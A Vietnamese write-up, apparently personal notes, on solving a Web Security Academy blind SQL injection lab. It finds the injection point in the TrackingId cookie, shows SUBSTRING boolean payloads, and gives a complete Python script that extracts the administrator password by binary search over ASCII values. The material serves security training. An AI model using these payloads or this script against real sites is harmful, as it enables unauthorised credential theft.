![[Pasted image 20260605095005.png]]
# Tổng quan về lab
-Đầu tiên đọc description của lab,ta thấy lab không còn sử dụng SQL query parameters ở URL nữa,mà thay vào đó là sử dụng ở phần Cookie,với mỗi lần query đúng sẽ trả về chuỗi `Welcome back`
![[Pasted image 20260605095255.png]]
-Khi dùng Burp truy cập vào lab,ta thấy có 2 cookie được sử dụng trong bài vậy ta thử cho cả `session` lẫn `TrackingId` bằng cách thêm `' AND 1=2--` vào từng cookie,nếu nó không trả về chuỗi `Welcome Back` thì đó là SQLi và ngược lại:
Đầu tiên ta thử với `session`:
![[Pasted image 20260605100456.png]]
Với query `' AND 1=2--` đáng lý ra nó phải là sai và không trả về chuỗi,khi ta thử dùng inspect để query thì nó lại tạo ra `session`mới => session không bị SQLi
Tiếp theo,ta thử với `TrackingId`:
![[Pasted image 20260605100809.png]]
Khi ta send request với add thêm query `' AND 1=2--` thì lúc này Welcome Back! không còn xuất hiện ở respone nữa
=> SQLi
# Khai thác
-Vì hàm trả về `Welcome Back!` nếu đúng, và không trả nếu sai ta dùng query Substring để 
```SQL
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'
```
Bản chất SUBSTRING sẽ có tác dụng là
Lấy password của user `administrator`, cắt ra **ký tự đầu tiên**, rồi kiểm tra xem ký tự đó có phải `'a'` không.
Ta thử từng ký tự một từ `a-z`:
```SQL
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'
...
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='z'
```
![[Pasted image 20260605110157.png]]
Vì nếu dùng `Burp Repeater` sẽ mất thời gian,ta sẽ chuyển sang viết script Python:
```Python
import requests

import string

  

url = "https://0abf00d904ca230684a5a95d003700aa.web-security-academy.net/"

  

# Lấy cookie thật từ server

init = requests.get(url)

tracking_id = init.cookies.get('TrackingId', '')

session_cookie = init.cookies.get('session', '')

print(f"[*] TrackingId: {tracking_id}")

  

def check_condition(payload):

    cookies = {

        'TrackingId': f"{tracking_id}' AND ({payload})--",

        'session': session_cookie

    }

    r = requests.get(url, cookies=cookies)

    return "Welcome back" in r.text

  

def extract_char(position):

    """Binary search trên ASCII value."""

    low, high = 32, 126  # printable ASCII range

    while low <= high:

        mid = (low + high) // 2

        # Hỏi: ASCII value của ký tự tại position có > mid không?

        payload = f"ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1))>{mid}"

        if check_condition(payload):

            low = mid + 1

        else:

            high = mid - 1

    return chr(low) if 32 <= low <= 126 else None

  

def extract_data():

    extracted = ""

    print("[+] Starting extraction...")

  

    for i in range(1, 30):

        char = extract_char(i)

        if not char or char == ' ':

            break

        extracted += char

        print(f"[+] Found: {extracted}")

  

    print(f"\n[+] Finished! Extracted: {extracted}")

  

extract_data()
```
Với việc dùng Ascii sẽ giúp tối ưu cho việc gửi request hơn...
Chạy python và đợi một lúc ta được:
![[Pasted image 20260605113201.png]]
Việc còn lại của ta là đăng nhập và solved lab!
![[Pasted image 20260605113258.png]]
=>solved